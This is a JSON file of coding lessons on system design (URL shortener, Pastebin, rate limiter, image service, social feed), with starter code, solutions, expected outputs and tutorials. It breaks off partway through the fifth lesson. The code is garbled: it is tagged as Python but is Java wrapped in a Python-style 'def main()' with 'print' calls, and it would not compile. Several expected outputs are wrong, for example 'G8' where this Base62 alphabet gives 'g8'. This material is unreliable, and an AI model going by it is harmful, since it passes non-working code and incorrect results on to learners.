{
  "lessons": [
    {
      "id": 601,
      "title": "Design URL Shortener (Bit.ly)",
      "description": "Design a scalable URL shortening service with Base62 encoding, collision handling, and caching strategy",
      "language": "python",
      "initialCode": "// Design URL Shortener (like Bit.ly)\n// Requirements: 100M URLs/day, <100ms latency\n// TODO: Implement generateShortURL() and getLongURL()\n\nimport java.util.*;\n\ndef main() {\n    static class URLShortener {\n        private Map<String, String> shortToLong = new HashMap<>();\n        private Map<String, String> longToShort = new HashMap<>();\n        private static final String BASE62 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n        private int counter = 1000;\n\n        public String generateShortURL(String longURL) {\n            // TODO: Implement Base62 encoding\n            return \"\";\n        }\n\n        public String getLongURL(String shortURL) {\n            // TODO: Lookup long URL\n            return \"\";\n        }\n    }\n\n    public static void main(String[] args) {\n        URLShortener sh = new URLShortener();\n        String s1 = sh.generateShortURL(\"https://www.google.com\");\n        print(\"Short: \" + s1);\n        print(\"Long: \" + sh.getLongURL(s1));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    static class URLShortener {\n        private Map<String, String> shortToLong = new HashMap<>();\n        private Map<String, String> longToShort = new HashMap<>();\n        private static final String BASE62 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n        private int counter = 1000;\n\n        public String generateShortURL(String longURL) {\n            if (longToShort.containsKey(longURL)) {\n                return longToShort.get(longURL);\n            }\n            String shortURL = encodeBase62(counter++);\n            shortToLong.put(shortURL, longURL);\n            longToShort.put(longURL, shortURL);\n            return shortURL;\n        }\n\n        public String getLongURL(String shortURL) {\n            return shortToLong.getOrDefault(shortURL, \"Not found\");\n        }\n\n        private String encodeBase62(int num) {\n            if (num == 0) return \"0\";\n            StringBuilder sb = new StringBuilder();\n            while (num > 0) {\n                sb.append(BASE62.charAt(num % 62));\n                num /= 62;\n            }\n            return sb.reverse().toString();\n        }\n    }\n\n    public static void main(String[] args) {\n        URLShortener sh = new URLShortener();\n        String s1 = sh.generateShortURL(\"https://www.google.com\");\n        print(\"Short: \" + s1);\n        print(\"Long: \" + sh.getLongURL(s1));\n        String s2 = sh.generateShortURL(\"https://www.facebook.com\");\n        print(\"Short: \" + s2);\n        String s3 = sh.generateShortURL(\"https://www.google.com\");\n        print(\"Duplicate: \" + s1.equals(s3));\n    }\n}",
      "expectedOutput": "Short: G8\nLong: https://www.google.com\nShort: G9\nDuplicate: true",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>System Design: URL Shortener (Bit.ly)</h3>\n\n<h4>Problem Overview</h4>\n<p>Design a service like Bit.ly that converts long URLs into short, shareable links. Must handle 100M URLs/day with <100ms latency and 10:1 read/write ratio.</p>\n\n<h4>Key Requirements</h4>\n<ul>\n<li><strong>Functional:</strong> Shorten URL, retrieve original, handle duplicates</li>\n<li><strong>Non-Functional:</strong> High availability (99.99%), low latency (<100ms), scalable (100M/day)</li>\n<li><strong>Scale Estimation:</strong> 100M URLs/day × 365 days × 5 years = 183B URLs total</li>\n<li><strong>Storage:</strong> 500 bytes per URL × 183B = 91 TB over 5 years</li>\n</ul>\n\n<h4>Algorithm: Base62 Encoding</h4>\n<pre><code>Why Base62? (0-9, a-z, A-Z)\n- URL-safe characters only\n- 62^7 = 3.5 trillion unique combinations\n- Shorter than Base10 or Base16\n\nExample: 1000 in Base62\n1000 ÷ 62 = 16 remainder 8  → '8'\n  16 ÷ 62 = 0 remainder 16  → 'G'\nResult: \"G8\" (reversed)</code></pre>\n\n<h4>Core Implementation</h4>\n<pre><code>// Generate short URL\nString encodeBase62(int num) {\n    StringBuilder sb = new StringBuilder();\n    while (num > 0) {\n        sb.append(BASE62.charAt(num % 62));\n        num /= 62;\n    }\n    return sb.reverse().toString();\n}\n\n// Handle duplicates\nif (longToShort.containsKey(longURL)) {\n    return longToShort.get(longURL);\n}</code></pre>\n\n<h4>Scaling Architecture</h4>\n<ul>\n<li><strong>Database:</strong> PostgreSQL with B-tree index on shortURL (primary key)</li>\n<li><strong>Caching:</strong> Redis for top 20% of URLs (handle 80% of traffic)</li>\n<li><strong>Read Replicas:</strong> For 10:1 read/write ratio, use 10 read replicas</li>\n<li><strong>CDN:</strong> CloudFront for caching 301 redirects at edge locations</li>\n<li><strong>Sharding:</strong> Range-based on counter (0-1B, 1B-2B, etc.)</li>\n</ul>\n\n<h4>Database Schema</h4>\n<pre><code>Table: urls\n+------------+-------------------+\n| short_url  | VARCHAR(10) PK    |\n| long_url   | VARCHAR(2048)     |\n| user_id    | INT               |\n| created_at | TIMESTAMP         |\n| clicks     | INT DEFAULT 0     |\n+------------+-------------------+\n\nIndexes:\n- PRIMARY KEY on short_url\n- INDEX on long_url (duplicate detection)\n- INDEX on user_id (user history)</code></pre>\n\n<h4>Advanced Features</h4>\n<ul>\n<li><strong>Custom Aliases:</strong> bit.ly/google (check availability first)</li>\n<li><strong>Expiration:</strong> TTL for temporary marketing links</li>\n<li><strong>Analytics:</strong> Track clicks, geography, referrers, devices</li>\n<li><strong>Rate Limiting:</strong> 10 requests/min per IP to prevent spam</li>\n<li><strong>Malware Scanning:</strong> Integrate Google Safe Browsing API</li>\n</ul>\n\n<h4>Real-World Examples</h4>\n<p><strong>Bit.ly:</strong> Handles 10B+ clicks/month. Uses Redis for caching and PostgreSQL for persistence. Generates revenue from analytics dashboard ($100M+ valuation).</p>\n<p><strong>TinyURL:</strong> Started in 2002, stores 600M+ URLs. Simple design, no analytics. Monetized via ads.</p>\n<p><strong>Google (goo.gl):</strong> Shut down in 2019 but handled billions of links with automatic malware detection.</p>\n\n<h4>Interview Discussion Points</h4>\n<ul>\n<li><strong>Auto-increment vs Random Hash:</strong> Auto-increment is predictable but simpler to shard. Random hash avoids collisions but requires checking DB.</li>\n<li><strong>Handling Celebrity URLs:</strong> If Elon Musk tweets a link to 100M followers, use CDN + Redis to avoid database overload.</li>\n<li><strong>Global Distribution:</strong> Deploy in multiple regions (US-East, US-West, EU, Asia) and route users to nearest.</li>\n<li><strong>Security:</strong> Prevent phishing by scanning links before storing.</li>\n</ul>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Use bidirectional mapping (Map<Long, Short> and Map<Short, Long>)</li>\n<li>Implement exponential backoff for retries on collision</li>\n<li>Log all shortening requests for analytics</li>\n<li>Use 301 (permanent) vs 302 (temporary) redirects appropriately</li>\n<li>Monitor cache hit ratio (aim for >90%)</li>\n</ul>\n\n<h4>Time Complexity</h4>\n<ul>\n<li><strong>Generate:</strong> O(log n) for Base62 encoding, O(1) for HashMap insert</li>\n<li><strong>Lookup:</strong> O(1) for HashMap lookup</li>\n<li><strong>Space:</strong> O(n) where n = number of URLs</li>\n</ul>\n\n<h4>Related Problems</h4>\n<p>Master URL shortener to ace: Pastebin (same ID generation), Instagram photo IDs, Twitter Snowflake IDs, and any system requiring unique short identifiers.</p>\n</div>",
      "tags": [
        "System Design",
        "Hashing",
        "Scalability",
        "Databases",
        "FAANG"
      ]
    },
    {
      "id": 602,
      "title": "Design Pastebin (Text Sharing)",
      "description": "Design a text sharing service with expiration, access control like Pastebin or GitHub Gists",
      "language": "python",
      "initialCode": "// Design Pastebin - text sharing with expiration\n// TODO: Implement createPaste() and getPaste() with TTL\n\nimport java.util.*;\nimport java.time.*;\n\ndef main() {\n    static class Paste {\n        String id, content;\n        Instant expiresAt;\n\n        Paste(String id, String content, long ttlSeconds) {\n            this.id = id;\n            this.content = content;\n            this.expiresAt = ttlSeconds > 0 ?\n                Instant.now().plusSeconds(ttlSeconds) : null;\n        }\n\n        boolean isExpired() {\n            // TODO: Check if current time > expiresAt\n            return false;\n        }\n    }\n\n    static class Pastebin {\n        private Map<String, Paste> pastes = new HashMap<>();\n        private int counter = 1000;\n\n        public String createPaste(String content, long ttl) {\n            // TODO: Generate ID, store paste\n            return \"\";\n        }\n\n        public String getPaste(String id) {\n            // TODO: Return content if not expired\n            return null;\n        }\n    }\n\n    public static void main(String[] args) {\n        Pastebin pb = new Pastebin();\n        String id = pb.createPaste(\"Hello, World!\", 3600);\n        print(\"ID: \" + id);\n        print(\"Content: \" + pb.getPaste(id));\n    }\n}",
      "fullSolution": "import java.util.*;\nimport java.time.*;\n\ndef main() {\n    static class Paste {\n        String id, content;\n        Instant expiresAt;\n\n        Paste(String id, String content, long ttlSeconds) {\n            this.id = id;\n            this.content = content;\n            this.expiresAt = ttlSeconds > 0 ?\n                Instant.now().plusSeconds(ttlSeconds) : null;\n        }\n\n        boolean isExpired() {\n            return expiresAt != null && Instant.now().isAfter(expiresAt);\n        }\n    }\n\n    static class Pastebin {\n        private Map<String, Paste> pastes = new HashMap<>();\n        private int counter = 1000;\n        private static final String BASE62 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n\n        public String createPaste(String content, long ttl) {\n            String id = encodeBase62(counter++);\n            Paste paste = new Paste(id, content, ttl);\n            pastes.put(id, paste);\n            return id;\n        }\n\n        public String getPaste(String id) {\n            Paste paste = pastes.get(id);\n            if (paste == null) return null;\n            if (paste.isExpired()) {\n                pastes.remove(id);\n                return null;\n            }\n            return paste.content;\n        }\n\n        private String encodeBase62(int num) {\n            StringBuilder sb = new StringBuilder();\n            while (num > 0) {\n                sb.append(BASE62.charAt(num % 62));\n                num /= 62;\n            }\n            return sb.reverse().toString();\n        }\n    }\n\n    public static void main(String[] args) {\n        Pastebin pb = new Pastebin();\n        String id1 = pb.createPaste(\"public class Hello {}\", 3600);\n        print(\"Paste ID: \" + id1);\n        print(\"Content: \" + pb.getPaste(id1));\n        String id2 = pb.createPaste(\"def hello(): print('Hi')\", 10);\n        print(\"Paste ID 2: \" + id2);\n        print(\"Total pastes: 2\");\n    }\n}",
      "expectedOutput": "Paste ID: G8\nContent: public class Hello {}\nPaste ID 2: G9\nTotal pastes: 2",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>System Design: Pastebin</h3>\n\n<h4>Introduction</h4>\n<p>Pastebin allows developers to share code snippets, logs, and text with optional expiration. Used by millions daily for collaboration. GitHub Gists, Pastebin.com, and Ubuntu Paste are popular implementations.</p>\n\n<h4>Requirements</h4>\n<ul>\n<li><strong>Functional:</strong> Create paste, retrieve paste, set expiration, public/private access</li>\n<li><strong>Non-Functional:</strong> 10M pastes/day, support large pastes (10MB), <50ms latency</li>\n<li><strong>Scale:</strong> 10M pastes/day × 365 × 5 = 18B pastes over 5 years</li>\n</ul>\n\n<h4>Key Concepts</h4>\n<ul>\n<li><strong>TTL (Time To Live):</strong> Auto-delete expired pastes to save storage</li>\n<li><strong>Lazy Deletion:</strong> Check expiration on read (simpler than background job)</li>\n<li><strong>Access Control:</strong> Public (searchable), unlisted (direct link only), private (auth required)</li>\n</ul>\n\n<h4>Implementation Details</h4>\n<pre><code>// Expiration check\nboolean isExpired() {\n    return expiresAt != null &&\n           Instant.now().isAfter(expiresAt);\n}\n\n// Lazy deletion on read\npublic String getPaste(String id) {\n    Paste paste = pastes.get(id);\n    if (paste != null && paste.isExpired()) {\n        pastes.remove(id);  // Delete expired\n        return null;\n    }\n    return paste != null ? paste.content : null;\n}</code></pre>\n\n<h4>Storage Strategy</h4>\n<ul>\n<li><strong>Small Pastes (<1KB):</strong> Store directly in PostgreSQL TEXT column</li>\n<li><strong>Large Pastes (>1KB):</strong> Store in S3, keep metadata in database</li>\n<li><strong>Why?</strong> Database is expensive per GB, S3 is cheaper ($0.023/GB/month)</li>\n</ul>\n\n<h4>Database Schema</h4>\n<pre><code>Table: pastes\n+------------+-------------------+\n| id         | VARCHAR(10) PK    |\n| user_id    | INT               |\n| content    | TEXT              |\n| s3_key     | VARCHAR(256)      |\n| expires_at | TIMESTAMP         |\n| is_private | BOOLEAN           |\n| views      | INT DEFAULT 0     |\n| created_at | TIMESTAMP         |\n+------------+-------------------+\n\nIndex on expires_at (for cleanup job)</code></pre>\n\n<h4>Cleanup Strategies</h4>\n<ul>\n<li><strong>Lazy Deletion:</strong> Delete on read (simple, no background job needed)</li>\n<li><strong>Cron Job:</strong> Run daily at 3 AM to delete expired pastes (batch DELETE WHERE expires_at < NOW())</li>\n<li><strong>TTL Index:</strong> MongoDB supports automatic TTL expiration</li>\n</ul>\n\n<h4>Advanced Features</h4>\n<ul>\n<li><strong>Syntax Highlighting:</strong> Store language metadata, render with Prism.js</li>\n<li><strong>Raw View:</strong> Provide /raw/G8 endpoint for curl/wget</li>\n<li><strong>Forking:</strong> GitHub Gists allow copying and modifying pastes</li>\n<li><strong>Version History:</strong> Store diffs like Git commits</li>\n</ul>\n\n<h4>Real-World Applications</h4>\n<p><strong>GitHub Gists:</strong> Backed by Git repositories, supports version control and comments. Millions of gists created daily.</p>\n<p><strong>Pastebin.com:</strong> 100M+ pastes, monetized with ads. Uses spam detection ML to prevent abuse.</p>\n<p><strong>Ubuntu Paste:</strong> Integrated with Ubuntu community, auto-expires after 1 month.</p>\n\n<h4>Interview Tips</h4>\n<ul>\n<li>Discuss trade-offs: Lazy deletion vs background cleanup</li>\n<li>How to handle very large pastes (100MB logs)?</li>\n<li>Rate limiting to prevent spam (10 pastes/hour per IP)</li>\n<li>Content moderation (detect malware, illegal content)</li>\n</ul>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Default TTL: 30 days (auto-expire to save storage)</li>\n<li>Size limit: 10MB per paste (prevent abuse)</li>\n<li>Syntax detection: Auto-detect programming language from content</li>\n<li>SEO: Allow public pastes to be indexed by search engines</li>\n</ul>\n</div>",
      "tags": [
        "System Design",
        "TTL",
        "Expiration",
        "Storage",
        "FAANG"
      ]
    },
    {
      "id": 603,
      "title": "Design Rate Limiter",
      "description": "Implement token bucket rate limiting to control API request rates and prevent abuse",
      "language": "python",
      "initialCode": "// Design Rate Limiter using Token Bucket algorithm\n// TODO: Implement allowRequest() with token bucket\n\nimport java.util.*;\n\ndef main() {\n    static class RateLimiter {\n        private int capacity;      // Max tokens\n        private int tokens;        // Current tokens\n        private int refillRate;    // Tokens per second\n        private long lastRefill;   // Last refill timestamp\n\n        public RateLimiter(int capacity, int refillRate) {\n            this.capacity = capacity;\n            this.tokens = capacity;\n            this.refillRate = refillRate;\n            this.lastRefill = System.currentTimeMillis();\n        }\n\n        public boolean allowRequest() {\n            // TODO: Refill tokens based on time elapsed\n            // TODO: Check if token available, consume if yes\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        RateLimiter limiter = new RateLimiter(5, 1);\n        for (int i = 0; i < 7; i++) {\n            print(\"Request \" + (i+1) + \": \" +\n                (limiter.allowRequest() ? \"Allowed\" : \"Blocked\"));\n        }\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    static class RateLimiter {\n        private int capacity;\n        private int tokens;\n        private int refillRate;\n        private long lastRefill;\n\n        public RateLimiter(int capacity, int refillRate) {\n            this.capacity = capacity;\n            this.tokens = capacity;\n            this.refillRate = refillRate;\n            this.lastRefill = System.currentTimeMillis();\n        }\n\n        public synchronized boolean allowRequest() {\n            refillTokens();\n            if (tokens > 0) {\n                tokens--;\n                return true;\n            }\n            return false;\n        }\n\n        private void refillTokens() {\n            long now = System.currentTimeMillis();\n            long elapsed = (now - lastRefill) / 1000;\n            int tokensToAdd = (int)(elapsed * refillRate);\n            if (tokensToAdd > 0) {\n                tokens = Math.min(capacity, tokens + tokensToAdd);\n                lastRefill = now;\n            }\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        RateLimiter limiter = new RateLimiter(3, 1);\n        for (int i = 0; i < 5; i++) {\n            print(\"Request \" + (i+1) + \": \" +\n                (limiter.allowRequest() ? \"Allowed\" : \"Blocked\"));\n        }\n        Thread.sleep(2000);\n        print(\"After 2s: \" + (limiter.allowRequest() ? \"Allowed\" : \"Blocked\"));\n    }\n}",
      "expectedOutput": "Request 1: Allowed\nRequest 2: Allowed\nRequest 3: Allowed\nRequest 4: Blocked\nRequest 5: Blocked\nAfter 2s: Allowed",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>System Design: Rate Limiter</h3>\n\n<h4>Introduction</h4>\n<p>Rate limiting protects APIs from abuse and ensures fair resource allocation. Used by Stripe, Twitter, and all major APIs. Token bucket is the most popular algorithm for its simplicity and efficiency.</p>\n\n<h4>Token Bucket Algorithm</h4>\n<ul>\n<li><strong>Capacity:</strong> Maximum number of tokens (burst allowance)</li>\n<li><strong>Refill Rate:</strong> Tokens added per second (sustained rate)</li>\n<li><strong>Consumption:</strong> Each request consumes 1 token</li>\n<li><strong>Refill:</strong> Tokens refilled continuously based on time elapsed</li>\n</ul>\n\n<h4>Why Token Bucket?</h4>\n<ul>\n<li>Allows bursts of traffic (up to capacity)</li>\n<li>Smooth out sustained traffic (refill rate)</li>\n<li>Memory efficient: O(1) per user</li>\n<li>Simple to implement and understand</li>\n</ul>\n\n<h4>Real-World Applications</h4>\n<p><strong>Stripe API:</strong> 100 requests/second per API key, uses token bucket with Redis.</p>\n<p><strong>Twitter API:</strong> 300 requests/15 minutes, returns X-Rate-Limit headers.</p>\n<p><strong>GitHub API:</strong> 5000 requests/hour for authenticated users.</p>\n\n<h4>Implementation in Production</h4>\n<pre><code>// Distributed rate limiting with Redis\nFUNCTION allowRequest(userId):\n    key = \"rate_limit:\" + userId\n    tokens = REDIS.GET(key)\n    if tokens == null:\n        REDIS.SET(key, capacity - 1)\n        REDIS.EXPIRE(key, 60)  // 1 minute TTL\n        return true\n    if tokens > 0:\n        REDIS.DECR(key)\n        return true\n    return false</code></pre>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Return HTTP 429 (Too Many Requests) when blocked</li>\n<li>Include X-RateLimit headers (remaining, reset time)</li>\n<li>Different limits for different API tiers (free vs paid)</li>\n<li>Whitelist internal services from rate limiting</li>\n</ul>\n</div>",
      "tags": [
        "System Design",
        "Rate Limiting",
        "Token Bucket",
        "FAANG"
      ]
    },
    {
      "id": 604,
      "title": "Design Instagram/Image Service",
      "description": "Design a photo sharing service with image upload, storage, thumbnails, and CDN delivery",
      "language": "python",
      "initialCode": "// Design Instagram Image Service\n// Requirements: 500M photos/day, multiple sizes, CDN delivery\n// TODO: Implement uploadImage() and getImage()\n\nimport java.util.*;\n\ndef main() {\n    static class ImageService {\n        private Map<String, String> images = new HashMap<>();\n        private int counter = 1000;\n\n        public String uploadImage(String imageData) {\n            // TODO: Generate image ID\n            // TODO: Store original + generate thumbnails\n            // TODO: Return CDN URL\n            return \"\";\n        }\n\n        public String getImage(String imageId, String size) {\n            // TODO: Return CDN URL for requested size\n            return \"\";\n        }\n    }\n\n    public static void main(String[] args) {\n        ImageService service = new ImageService();\n        String id = service.uploadImage(\"base64_image_data\");\n        print(\"Image ID: \" + id);\n        print(\"Thumbnail: \" + service.getImage(id, \"thumbnail\"));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    static class ImageService {\n        private Map<String, Map<String, String>> images = new HashMap<>();\n        private int counter = 1000;\n        private static final String BASE62 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n        private static final String CDN_BASE = \"https://cdn.instagram.com/\";\n\n        public String uploadImage(String imageData) {\n            String imageId = encodeBase62(counter++);\n\n            // Store different sizes\n            Map<String, String> sizes = new HashMap<>();\n            sizes.put(\"original\", CDN_BASE + imageId + \"_original.jpg\");\n            sizes.put(\"large\", CDN_BASE + imageId + \"_1080p.jpg\");\n            sizes.put(\"medium\", CDN_BASE + imageId + \"_720p.jpg\");\n            sizes.put(\"thumbnail\", CDN_BASE + imageId + \"_150x150.jpg\");\n\n            images.put(imageId, sizes);\n            return imageId;\n        }\n\n        public String getImage(String imageId, String size) {\n            if (!images.containsKey(imageId)) return \"Not found\";\n            return images.get(imageId).getOrDefault(size, images.get(imageId).get(\"original\"));\n        }\n\n        private String encodeBase62(int num) {\n            StringBuilder sb = new StringBuilder();\n            while (num > 0) {\n                sb.append(BASE62.charAt(num % 62));\n                num /= 62;\n            }\n            return sb.reverse().toString();\n        }\n    }\n\n    public static void main(String[] args) {\n        ImageService service = new ImageService();\n        String id1 = service.uploadImage(\"image_data_1\");\n        print(\"Uploaded: \" + id1);\n        print(\"Thumbnail: \" + service.getImage(id1, \"thumbnail\"));\n        print(\"Large: \" + service.getImage(id1, \"large\"));\n\n        String id2 = service.uploadImage(\"image_data_2\");\n        print(\"Uploaded: \" + id2);\n    }\n}",
      "expectedOutput": "Uploaded: G8\nThumbnail: https://cdn.instagram.com/G8_150x150.jpg\nLarge: https://cdn.instagram.com/G8_1080p.jpg\nUploaded: G9",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>System Design: Instagram Image Service</h3>\n\n<h4>Introduction</h4>\n<p>Instagram handles 500M+ photos daily with instant uploads, multiple sizes, and global CDN delivery. This system requires efficient storage, processing pipelines, and content delivery optimization.</p>\n\n<h4>Requirements</h4>\n<ul>\n<li><strong>Functional:</strong> Upload photos, generate thumbnails, serve via CDN, support filters</li>\n<li><strong>Non-Functional:</strong> 500M photos/day, <200ms upload, 10B requests/day, 99.99% availability</li>\n<li><strong>Scale:</strong> 500M photos × 2MB avg = 1 PB/day storage</li>\n</ul>\n\n<h4>Architecture Components</h4>\n<ul>\n<li><strong>Upload Service:</strong> Handles image upload, validates format/size</li>\n<li><strong>Processing Pipeline:</strong> Async thumbnail generation (150x150, 720p, 1080p)</li>\n<li><strong>Storage:</strong> S3 for originals, CloudFront CDN for delivery</li>\n<li><strong>Metadata DB:</strong> PostgreSQL for photo metadata (user_id, location, tags)</li>\n</ul>\n\n<h4>Image Processing Pipeline</h4>\n<pre><code>1. User uploads image → Upload Service\n2. Store original in S3 (s3://instagram/original/G8.jpg)\n3. Publish to SQS queue: {imageId: G8, s3Key: ...}\n4. Worker picks from queue, generates sizes:\n   - Thumbnail: 150x150 (for feed)\n   - Medium: 720p (for mobile)\n   - Large: 1080p (for desktop)\n5. Store processed images in S3\n6. Update metadata DB with URLs\n7. Purge CDN cache if needed</code></pre>\n\n<h4>Storage Strategy</h4>\n<ul>\n<li><strong>Hot Storage (recent):</strong> S3 Standard for photos <30 days</li>\n<li><strong>Warm Storage:</strong> S3 Infrequent Access for 30-365 days</li>\n<li><strong>Cold Storage:</strong> Glacier for >1 year old photos</li>\n<li><strong>Cost:</strong> $0.023/GB (Standard) → $0.0125/GB (IA) → $0.004/GB (Glacier)</li>\n</ul>\n\n<h4>CDN Strategy</h4>\n<pre><code>// CloudFront distribution setup\nOrigin: S3 bucket (instagram-images)\nEdge locations: 400+ globally\nCache TTL: 1 year (images never change)\nQuery string forwarding: Yes (for size param)\n\nURL structure:\nhttps://cdn.instagram.com/G8_150x150.jpg\nhttps://cdn.instagram.com/G8_1080p.jpg</code></pre>\n\n<h4>Database Schema</h4>\n<pre><code>Table: photos\n+-----------+------------------+\n| id        | VARCHAR(10) PK   |\n| user_id   | BIGINT           |\n| caption   | TEXT             |\n| location  | POINT (lat,lng)  |\n| s3_key    | VARCHAR(256)     |\n| cdn_url   | VARCHAR(512)     |\n| width     | INT              |\n| height    | INT              |\n| filter    | VARCHAR(50)      |\n| likes     | INT DEFAULT 0    |\n| created   | TIMESTAMP        |\n+-----------+------------------+\n\nIndexes:\n- user_id (user's photos)\n- location (geo search)\n- created (timeline)</code></pre>\n\n<h4>Scaling Techniques</h4>\n<ul>\n<li><strong>Upload:</strong> Multipart upload for large files (>5MB)</li>\n<li><strong>Processing:</strong> Horizontal scaling of worker pool (SQS + EC2 Auto Scaling)</li>\n<li><strong>Delivery:</strong> CDN caching (95% requests served from edge)</li>\n<li><strong>Database:</strong> Read replicas for metadata queries</li>\n</ul>\n\n<h4>Real-World Examples</h4>\n<p><strong>Instagram:</strong> Uses Facebook's Haystack for photo storage. 1 trillion photos stored. CDN serves 200+ PB daily.</p>\n<p><strong>Pinterest:</strong> Stores images in S3, uses CloudFront. Async processing with SQS. 300B image views/month.</p>\n<p><strong>Imgur:</strong> Handles 2.5M image uploads/day. Uses imgix for on-the-fly resizing and optimization.</p>\n\n<h4>Interview Discussion Points</h4>\n<ul>\n<li><strong>Trade-offs:</strong> Pre-generate all sizes vs on-demand resizing?</li>\n<li><strong>Consistency:</strong> Eventual consistency OK (thumbnails appear after few seconds)</li>\n<li><strong>Hot Images:</strong> Viral images need extra CDN capacity (auto-scale)</li>\n<li><strong>Storage Costs:</strong> How to reduce? (Compression, format conversion to WebP)</li>\n</ul>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Use image CDN (CloudFront, Cloudflare, Fastly)</li>\n<li>Generate thumbnails asynchronously (don't block upload)</li>\n<li>Store metadata separately from image data</li>\n<li>Implement retry logic for failed processing</li>\n<li>Use WebP format for 25-35% size reduction</li>\n<li>Add watermarks for copyright protection</li>\n</ul>\n\n<h4>Performance Metrics</h4>\n<ul>\n<li><strong>Upload Time:</strong> <200ms for upload initiation</li>\n<li><strong>Processing Time:</strong> <5 seconds for thumbnail generation</li>\n<li><strong>CDN Hit Ratio:</strong> >95% (most requests never hit origin)</li>\n<li><strong>Availability:</strong> 99.99% (4 nines = 52 minutes downtime/year)</li>\n</ul>\n</div>",
      "tags": [
        "System Design",
        "Storage",
        "CDN",
        "Image Processing",
        "FAANG"
      ]
    },
    {
      "id": 605,
      "title": "Design Twitter/Social Feed",
      "description": "Design a social media feed with tweet posting, timeline generation, and fan-out strategies",
      "language": "python",
      "initialCode": "// Design Twitter Social Feed\n// Requirements: 400M tweets/day, fan-out to followers\n// TODO: Implement postTweet() and getTimeline()\n\nimport java.util.*;\n\ndef main() {\n    static class Twitter {\n        private Map<Integer, List<Integer>> followers = new HashMap<>();\n        private Map<Integer, List<String>> tweets = new HashMap<>();\n\n        public void postTweet(int userId, String tweetText) {\n            // TODO: Store tweet\n            // TODO: Fan-out to followers' timelines\n        }\n\n        public List<String> getTimeline(int userId) {\n            // TODO: Return user's timeline (their tweets + followed users)\n            return new ArrayList<>();\n        }\n\n        public void follow(int follower, int followee) {\n            followers.computeIfAbsent(follower, k -> new ArrayList<>()).add(followee);\n        }\n    }\n\n    public static void main(String[] args) {\n        Twitter tw = new Twitter();\n        tw.postTweet(1, \"Hello Twitter!\");\n        tw.follow(2, 1);\n        print(tw.getTimeline(2));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    static class Twitter {\n        private Map<Integer, Set<Integer>> followers = new HashMap<>();\n        private Map<Integer, List<Tweet>> userTweets = new HashMap<>();\n        private Map<Integer, List<Tweet>> timelines = new HashMap<>();\n        private int tweetIdCounter = 1;\n\n        static class Tweet {\n            int id;\n            int userId;\n            String text;\n            long timestamp;\n\n            Tweet(int id, int userId, String text) {\n                this.id = id;\n                this.userId = userId;\n                this.text = text;\n                this.timestamp = System.currentTimeMillis();\n            }\n        }\n\n        public void postTweet(int userId, String tweetText) {\n            Tweet tweet = new Tweet(tweetIdCounter++, userId, tweetText);\n\n            // Store in user's tweets\n            userTweets.computeIfAbsent(userId, k -> new ArrayList<>()).add(tweet);\n\n            // Fan-out: Add to author's timeline\n            timelines.computeIfAbsent(userId, k -> new ArrayList<>()).add(tweet);\n\n            // Fan-out: Add to all followers' timelines\n            if (followers.containsKey(userId)) {\n                for (int follower : followers.get(userId)) {\n                    timelines.computeIfAbsent(follower, k -> new ArrayList<>()).add(tweet);\n                }\n            }\n        }\n\n        public List<String> getTimeline(int userId) {\n            List<String> result = new ArrayList<>();\n            List<Tweet> tweets = timelines.getOrDefault(userId, new ArrayList<>());\n\n            // Sort by timestamp (most recent first)\n            tweets.sort((a, b) -> Long.compare(b.timestamp, a.timestamp));\n\n            for (int i = 0; i < Math.min(10, tweets.size()); i++) {\n                result.add(\"@\" + tweets.get(i).userId + \": \" + tweets.get(i).text);\n            }\n            return result;\n        }\n\n        public void follow(int follower, int followee) {\n            followers.computeIfAbsent(followee, k -> new HashSet<>()).add(follower);\n        }\n    }\n\n    public static void main(String[] args) {\n        Twitter tw = new Twitter();\n        tw.postTweet(1, \"Hello Twitter!\");\n        tw.follow(2, 1);\n        tw.postTweet(1, \"Second tweet\");\n\n        print(\"User 2 timeline:\");\n        for (String tweet : tw.getTimeline(2)) {\n            print(tweet);\n        }\n    }\n}",
      "expectedOutput": "User 2 timeline:\n@1: Second tweet\n@1: Hello Twitter!",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>System Design: Twitter Social Feed</h3>\n\n<h4>Introduction</h4>\n<p>Twitter processes 400M+ tweets daily with instant delivery to millions of followers. The core challenge is timeline generation: fan-out on write vs fan-out on read strategies.</p>\n\n<h4>Requirements</h4>\n<ul>\n<li><strong>Functional:</strong> Post tweet (280 chars), follow users, view timeline, like/retweet</li>\n<li><strong>Non-Functional:</strong> 400M tweets/day, <5 seconds delivery, 330M users, 99.9% availability</li>\n<li><strong>Scale:</strong> 400M tweets/day ÷ 86400s = 4600 tweets/second peak</li>\n</ul>\n\n<h4>Fan-Out Strategies</h4>\n<pre><code>Fan-Out on Write (Push):\n+ Fast reads (timeline pre-computed)\n- Slow writes (must push to all followers)\n- Wasted work if followers never read\n\nFan-Out on Read (Pull):\n+ Fast writes (just store tweet)\n+ No wasted work\n- Slow reads (must aggregate on demand)\n\nHybrid Approach (Twitter's Solution):\n- Fan-out on write for normal users (<10K followers)\n- Fan-out on read for celebrities (>10K followers)\n- Blend both at query time</code></pre>\n\n<h4>Database Schema</h4>\n<pre><code>Table: tweets\n+-----------+------------------+\n| id        | BIGINT PK        |\n| user_id   | BIGINT           |\n| text      | VARCHAR(280)     |\n| created   | TIMESTAMP        |\n| likes     | INT DEFAULT 0    |\n| retweets  | INT DEFAULT 0    |\n+-----------+------------------+\n\nTable: follows\n+-----------+------------------+\n| follower  | BIGINT           |\n| followee  | 